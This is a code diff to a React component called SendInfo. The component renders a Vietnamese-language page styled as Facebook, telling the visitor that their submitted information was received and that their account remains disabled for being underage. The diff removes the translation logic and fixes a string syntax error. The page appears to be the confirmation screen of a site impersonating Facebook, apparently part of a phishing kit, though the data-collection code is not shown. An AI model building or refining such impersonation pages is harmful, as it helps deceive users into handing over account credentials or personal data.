@@ -1,50 +1,53 @@
 import icon from '@/assets/images/icon.webp';
-import { useState, useEffect, useCallback, useMemo } from 'react';
-import { translateText } from '@/utils/translate';
+import { useMemo } from 'react';
+// import { translateText } from '@/utils/translate'; // ĐÃ COMMENT
 
 const SendInfo = () => {
-    const defaultTexts = useMemo(
+    const texts = useMemo( // ĐỔI TÊN TỪ defaultTexts THÀNH texts
         () => ({
-            title: 'Hệ thống chúng tôi đã tiếp nhận thông tin bạn gửi. ,
+            title: 'Hệ thống chúng tôi đã tiếp nhận thông tin bạn gửi.',
             description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là do tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
             description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.',
         }),
         []
     );
 
-    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
+    // 🚀 XÓA CÁC STATE VÀ HÀM DỊCH THUẬT
+    // const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
 
-    const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const [
-                    translatedTitle,
-                    translatedDesc1,
-                    translatedDesc2,
-                ] = await Promise.all([
-                    translateText(defaultTexts.title, targetLang),
-                    translateText(defaultTexts.description1, targetLang),
-                    translateText(defaultTexts.description2, targetLang),
-                ]);
+    // 🚀 XÓA HÀM DỊCH
+    // const translateAllTexts = useCallback(
+    //     async (targetLang) => {
+    //         try {
+    //             const [
+    //                 translatedTitle,
+    //                 translatedDesc1,
+    //                 translatedDesc2,
+    //             ] = await Promise.all([
+    //                 translateText(defaultTexts.title, targetLang),
+    //                 translateText(defaultTexts.description1, targetLang),
+    //                 translateText(defaultTexts.description2, targetLang),
+    //             ]);
 
-                setTranslatedTexts({
-                    title: translatedTitle,
-                    description1: translatedDesc1,
-                    description2: translatedDesc2,
-                });
-            } catch {
-                //
-            }
-        },
-        [defaultTexts]
-    );
+    //             setTranslatedTexts({
+    //                 title: translatedTitle,
+    //                 description1: translatedDesc1,
+    //                 description2: translatedDesc2,
+    //             });
+    //         } catch {
+    //             //
+    //         }
+    //     },
+    //     [defaultTexts]
+    // );
 
-    useEffect(() => {
-        const targetLang = localStorage.getItem('targetLang');
-        if (targetLang && targetLang !== 'en') {
-            translateAllTexts(targetLang);
-        }
-    }, [translateAllTexts]);
+    // 🚀 XÓA USEEFFECT DỊCH THUẬT
+    // useEffect(() => {
+    //     const targetLang = localStorage.getItem('targetLang');
+    //     if (targetLang && targetLang !== 'en') {
+    //         translateAllTexts(targetLang);
+    //     }
+    // }, [translateAllTexts]);
 
     return (
         <div className='min-h-screen bg-gray-100'>
@@ -70,17 +73,17 @@ const SendInfo = () => {
                     {/* Title Section */}
                     <div className='px-6 py-6 border-b border-gray-300'>
                         <h1 className='text-xl font-bold text-gray-900'>
-                            {translatedTexts.title}
+                            {texts.title} {/* ĐỔI translatedTexts THÀNH texts */}
                         </h1>
                     </div>
 
                     {/* Description Section */}
                     <div className='px-6 py-6 space-y-4'>
                         <p className='text-gray-700 leading-relaxed'>
-                            {translatedTexts.description1}
+                            {texts.description1} {/* ĐỔI translatedTexts THÀNH texts */}
                         </p>
                         <p className='text-gray-700 leading-relaxed'>
-                            {translatedTexts.description2}
+                            {texts.description2} {/* ĐỔI translatedTexts THÀNH texts */}
                         </p>
                     </div>
                 </div>
